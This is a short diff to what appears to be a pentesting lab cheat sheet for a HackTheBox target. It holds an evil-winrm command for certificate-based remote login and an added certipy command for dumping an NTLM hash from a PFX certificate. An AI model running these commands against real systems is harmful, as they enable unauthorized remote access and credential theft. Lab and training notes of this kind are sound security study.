@@ -17,3 +17,9 @@ IF NOT PASSWORD PROTECTED SKIP TO LINE 5.
 EXAMPLE USAGE OF KEYS
 
 evil-winrm -i box.htb -S -k mykey.key -c mykey.crt
+
+OTHER THINGS TO TRY
+
+Try and dump ntlm hash
+
+certipy auth -pfx user.pfx --dump
